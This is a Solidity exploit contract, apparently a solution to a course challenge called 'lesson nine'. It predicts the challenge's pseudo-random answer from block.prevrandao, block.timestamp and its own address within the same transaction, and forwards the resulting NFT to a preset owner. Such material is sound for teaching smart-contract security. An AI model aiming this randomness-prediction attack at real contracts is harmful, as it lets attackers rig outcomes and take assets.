// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ILessonNine {
    function solveChallenge(uint256 randomGuess, string calldata yourTwitterHandle) external;
}
interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}
interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external returns (bytes4);
}

contract HackLessonNine is IERC721Receiver {
    ILessonNine public lessonNine;
    address public immutable owner;

    constructor(address lessonAddr, address ownerEOA) {
        lessonNine = ILessonNine(lessonAddr);
        owner = ownerEOA; // tagret EOA
    }

    function attack(string calldata handle) external {
        uint256 answer = uint256(
            keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))
        ) % 100000;
        lessonNine.solveChallenge(answer, handle);
    }

    // NFT here and forward it to owner
    function onERC721Received(address, address, uint256 tokenId, bytes calldata)
        external
        returns (bytes4)
    {
        // msg.sender â€” ERC721 contract address
        IERC721(msg.sender).safeTransferFrom(address(this), owner, tokenId);
        return this.onERC721Received.selector; // 0x150b7a02
    }
}
